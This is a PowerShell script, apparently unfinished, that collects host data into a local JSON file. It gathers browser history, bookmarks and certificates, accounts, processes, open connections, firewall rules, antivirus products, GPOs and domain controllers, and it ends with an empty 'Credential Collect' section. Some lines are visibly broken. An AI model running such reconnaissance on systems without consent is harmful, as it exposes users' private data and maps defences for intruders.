import-module "sqlite" -force
#------------- Network -------------#

# Get network adapters and select wireless adapters only
$adapters = Get-NetAdapter

# Get IP address, subnet mask, default gateway, and MAC address for each adapter
$adapterInfo = foreach ($adapter in $adapters)
{
  $ipconfig = Get-NetIPAddress -InterfaceIndex $adapter.ifIndex | Where-Object {$_.AddressFamily -eq "IPv4"}
  $ipAddress = $ipconfig.IPAddress
  $subnetMask = $ipconfig.PrefixLength
  $gateway = (Get-NetRoute -InterfaceIndex $adapter.ifIndex | Where-Object {$_.DestinationPrefix -eq "0.0.0.0/0.0.0.0"}).NextHop
  $macAddress = $adapter.MacAddress
  $dnsServers = (Get-DnsClientServerAddress -InterfaceIndex $adapter.ifIndex).ServerAddresses

  # Output the information for this adapter
  [PSCustomObject]@{
    IPAddress = $ipAddress
    SubnetMask = $subnetMask
    DefaultGateway = $gateway
    MacAddress = $macAddress
    DnsServers = $dnsServers
  }
}

# Get configured proxy
$proxyPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings'
$proxy = (Get-ItemProperty -Path $proxyPath).ProxyServer

# Get configured VPN
$vpn = Get-VpnConnection | Select-Object -ExpandProperty Name

# Get domain name
$domainName = ([System.Net.NetworkInformation.IPGlobalProperties]::GetIPGlobalProperties()).DomainName

# Get computer name
$computerName = $env:COMPUTERNAME

# Net data request
$net = [PSCustomObject]@{
  adaptersInfo = $adapterInfo
  proxy = $proxy
  vpn = $vpn
  domainName = $domainName
  computerName = $computerName
}

#Miss wifi 


#------------- All-WebBrowser -------------#

$browserList = Get-ItemProperty HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\* | Where-Object {$_.DisplayName -like "*firefox*" -or $_.DisplayName -like "*edge*" }

$UserName = $end:UserName 
$browserDataList = @()
foreach ($browser in $browserList)
{
  $browserData = [PSCustomObject]@{
    Name = $browser.DisplayName
    version = $null
    addOns = @()
    certificates = @()
    identifiers = @()
    favorites = @()
    history = @()
  }

  if ($browser.UninstallString -like "*firefox*")
  {
    $extensionsFile = "$env:APPDATA\Mozilla\Firefox\Profiles\*\extensions.json"
    #Version
    $browser.version = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\firefox.exe').'(Default)').VersionInfo
    
    #Extension
    $extensionsJson = Get-Content $extensionsFile -Raw | ConvertFrom-Json
    $extensionsJson | ForEach-Object {
      Write-Host $_.name ": " $_.version
      $browserData.addOns += [PSCustomObject]@{
        name = $_.name
        version = $_.version
      }
    }


    #Favorites, certificates & history
    # Set the path to the Firefox profile directory
    $profilePath = "$env:APPDATA\Mozilla\Firefox\Profiles\"

    # Get the list of Firefox profiles
    $profiles = Get-ChildItem $profilePath -Directory

    foreach ($profile in $profiles)
    {
    
      $bookmarksFile = Join-Path $profile.FullName "places.sqlite"
      Add-Type -Path "C:\Program Files\System.Data.SQLite\sqlite-netFx45-static-binary\SQLite.Interop.dll"
      $connection = New-Object -TypeName System.Data.SQLite.SQLiteConnection("Data Source=$bookmarksFile")
      $connection.Open()

      #Bookmarks - Favorites
      $query = "SELECT title, url FROM moz_bookmarks WHERE type = 1 AND parent = 1"
      $command = New-Object -TypeName System.Data.SQLite.SQLiteCommand($query, $connection)
      $bookmarks = $command.ExecuteReader()
      while ($bookmarks.Read())
      {
        Write-Host $bookmarks["title"] ": " $bookmarks["url"]
        $browserData.favorites += [PSCustomObject]@{
          title = $bookmarks["title"]
          url = $bookmarks["url"]
        }
      }

      # Certificates
      $query = "SELECT DISTINCT nickname, issuer_name, subject_name FROM moz_certificates"
      $command = New-Object -TypeName System.Data.SQLite.SQLiteCommand($query, $connection)

      $certs = $command.ExecuteReader()

      while ($certs.Read())
      {
        Write-Host $certs["nickname"] ": " $certs["issuer_name"] " - " $certs["subject_name"]
        $browserData.certificates += [PSCustomObject]@{
          nickname = $certs["nickname"]
          issuer_name = $certs["issuer_name"]
          certs = $certs["subject_name"]
        }
      }

      # History
      $query = "SELECT url, title, last_visit_date FROM moz_places WHERE hidden = 0 ORDER BY last_visit_date DESC"
      $command = New-Object -TypeName System.Data.SQLite.SQLiteCommand($query, $connection)

      $history = $command.ExecuteReader()

      while ($history.Read())
      {
        Write-Host $history["url"] ": " $history["title"] " - " (Get-Date -Date "1970-01-01").AddSeconds($history["last_visit_date"])
        $browserData.history += [PSCustomObject]@{
          url = $history["url"]
          title = $history["title"]
          last_visit_date = (Get-Date -Date "1970-01-01").AddSeconds($history["last_visit_date"])
        }
      }

      $connection.Close()
    }
  } elseif ($browser.UninstallString -like "*edge*")
  {
    $extensionPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Extensions\"
    #Version
    $browser.version = (Get-Item (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\msedge.exe').'(Default)').VersionInfo

    #Extension
    $extensionIds = Get-ChildItem $extensionPath -Directory

    foreach ($extensionId in $extensionIds)
    {
      $manifestFile = Join-Path $extensionPath $extensionId "manifest.json"
      $manifest = Get-Content $manifestFile | ConvertFrom-Json
      Write-Host $manifest.name ": " $manifest.version
      $browserData.addOns += [PSCustomObject]@{
        name = $manifest.name
        version = $manifest.version
      }
    }

    # Certificate
    $certs = Get-ChildItem "Cert:\CurrentUser\My"| Sort-Object Subject

    $certs | ForEach-Object {
      $browserData.certificates += [PSCustomObject]@{
        subject = $_.Subject
        issuer = $_.Issuer
        thumbprint = $_.Thumbprint
      }
    }

    # Favorites
    $favoritesPath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Favorites\"
    $favoriteUrls = Get-ChildItem $favoritesPath -Recurse -Include *.url

    foreach ($favoriteUrl in $favoriteUrls)
    {
      $favoriteContents = Get-Content $favoriteUrl.FullName
      $name = ($favoriteContents | Select-String -Pattern "^(?:Name|TITLE)\s*=\s*(.*)").Matches.Groups[1].Value
      $url = ($favoriteContents | Select-String -Pattern "URL\s*=\s*(.*)").Matches.Groups[1].Value

      $browserData.favorites += [PSCustomObject]@{
        name = $name
        url = $url
      }
    }

    # History
    $historyFile = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
    $conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList "Data Source=$historyFile;Version=3;"
    $conn.Open()
    $query = "SELECT datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') AS 'VisitTime', title, url FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
    $command = $conn.CreateCommand()
    $command.CommandText = $query
    $results = $command.ExecuteReader()

    While ($results.Read())
    {
      $browserData.history += [PSCustomObject]@{
        visitTime = $results["VisitTime"]
        title = $results["title"]
        url = $results["url"]
      }
    }

    $conn.Close()

  }
  $browserDataList += $browserData
}

#------------- Longon cached -------------#

# Get the currently connected user accounts
$connectedAccounts = Get-LocalUser | Where-Object { $_.Enabled -eq $true}

# Get the cached accounts on the local machine
$cachedAccounts = Get-WmiObject -Class Win32_UserAccount | Where-Object { $_.LocalAccount -eq $true }

$accounts = [PSCustomObject]@{
  logged = $connectedAccounts
  cached = $cachedAccounts
}

#------------- Applications Information -------------#

# Get a list of installed applications
$applications32Path = "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"
$applicationsPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*" 
$applications = Get-ItemProperty $applications32Path, $applicationsPath|
  Where-Object { $_.DisplayName -and !$_.SystemComponent } |
  Select-Object DisplayName, Publisher, DisplayVersion

#------------- Start Menu -------------#

# Get information of start menu
$startMenuPath = "$env:APPDATA\Microsoft\Windows\Start Menu"
$startMenuItems = Get-ChildItem -Path $startMenuPath -Recurse | Where-Object { $_.Name -notlike "desktop.ini" }

#------------- Scheduled Tasks -------------#

# Get a list of scheduled tasks
$scheduledTasks = Get-ScheduledTask | Select-Object TaskName, TaskPath, State, LastRunTime, NextRunTime

#------------- Active Process -------------#

# Get a list of active process
$activeProcess = Get-Process | Select-Object Id,Name,MainWindowTitle

#------------- Activeport -------------#

# Get a list of active port
$activeTCPPorts = Get-NetTCPConnection | Where-Object {$_.State -eq "Established"} | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort

#------------- Security -------------#

# Get Os information
$os = Get-CimInstance Win32_OperatingSystem

$osInformations = [PSCustomObject]@{
  osCaption = $os.Caption
  osVersion = $os.Version
  osBuild = $os.BuildNumber
}

$servicePack = [PSCustomObject]@{
  majorVersion = $os.ServicePackMajorVersion
  minorVersion = $os.ServicePackMinorVersion
}

# Retrieve the active firewall profile
$firewall = Get-NetFirewallProfile -Profile Domain, Public, Private

# Retrieve the active firewall rules for the profile
$rules = $firewall | Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"}

# Save the active NAT and filter rules
$natRules = $rules | Where-Object {$_.Action -eq "Allow" -and $_.Direction -eq "Inbound" -and $_.EdgeTraversalPolicy -eq "Allow" -and $_.Protocol -eq "TCP"}
$filterRules = $rules | Where-Object {$_.Action -eq "Allow" -and $_.Direction -eq "Inbound" -and $_.Protocol -eq "TCP" -and $_.Program -ne $null}

$firewallRules = [PSCustomObject]@{
  natRules = $natRules
  filterRules = $filterRules
}

# Retrieve the list of installed antivirus software
$antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct
$antivirusList = New-Object System.Collections.ArrayList
# Save the name and version of each installed antivirus software
Write-Output "Installed antivirus software:"
foreach ($av in $antivirus)
{
  $currentAntivirus = [PSCustomObject]@{
    name = $av.displayName
    version = $av.displayVersion
  }
  $antivirusList.Add($currentAntivirus)
}

# Retrieve the current SRP or AppLocker configuration
$configSRP = Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName "SecurityCenter2" |
  Select-Object AppLockerEnabled, IsSoftwareRestrictionPolicyEnforced


# Retrieve the list of applied GPOs
$gpos = Get-GpResultantSetOfPolicy -ReportType Computer -ErrorAction SilentlyContinue

$GPOInformations = New-Object System.Collections.ArrayList
foreach ($gpo in $gpos.AppliedGPOs)
{
  $currentGPO = [PSCustomObject]@{
    name = $gpo.DisplayName
    id = $gpo.GPOID
  }
  $GPOInformations.Add($currentGPO)
}

$domainControllersList = New-Object System.Collections.ArrayList

# Retrieve the list of domain controllers
$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$domainControllers = $domain.DomainControllers

# save the list of domain controllers with names and IP addresses
Write-Output "Domain Controllers:"
foreach ($dc in $domainControllers)
{
  $ip = ([System.Net.Dns]::GetHostAddresses($dc.Name) | Where-Object { $_.AddressFamily -eq "InterNetwork" }).IPAddressToString
  $currentDc = [PSCustomObject]@{
    name = $dc.name
    ip = $ip
  }
  $domainControllersList.Add($currentDc)
}



$security = [PSCustomObject]@{
  os = $osInformations
  servicePack = $servicePack
  patches = Get-HotFix | Select-Object -Property Description, HotFixId
  firewallRules = $firewallRules
  antivirus = $antivirusList
  appLockerEnabled = $configSRP.appLockerEnabled
  SRPEnforced = $configSRP.IsSoftwareRestrictionPolicyEnforced
  GPOs = $GPOInformations
  domainControllers = $domainControllersList
}
#------------- Export json -------------#

# Recap object
$finalObject = [PSCustomObject]@{
  net = $net
  WebBrowser = $browserDataList
  accounts = $accounts
  applications = $applications
  startMenu = $startMenuItems
  scheduledTasks = $scheduledTasks
  activeProcess = $activeProcess
  activePort = $activeTCPPorts
  Security = $security
}

# Save data as json file
ConvertTo-Json $finalObject | Set-Content result.json


#------------- Crendential Collect -------------#
